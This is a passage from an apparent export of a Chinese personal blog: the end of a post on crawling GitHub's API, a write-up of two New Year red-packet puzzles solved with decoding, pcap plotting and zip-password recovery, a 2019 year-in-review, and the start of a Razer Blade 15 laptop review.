href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 